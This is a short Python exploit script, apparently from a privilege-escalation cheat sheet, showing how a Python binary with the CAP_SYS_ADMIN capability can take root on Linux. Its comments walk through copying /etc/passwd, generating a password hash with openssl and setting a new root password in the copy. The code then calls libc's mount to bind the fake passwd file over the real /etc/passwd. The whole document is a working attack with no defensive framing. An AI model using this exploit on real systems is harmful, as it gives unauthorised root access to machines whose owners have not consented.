# When python has CAP_SYS_ADMIN
#
# cp /etc/passwd ./ #Create a copy of the passwd file
# openssl passwd -1 -salt abc password #Get hash of "password"
# vim ./passwd #Change roots passwords of the fake passwd file

from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
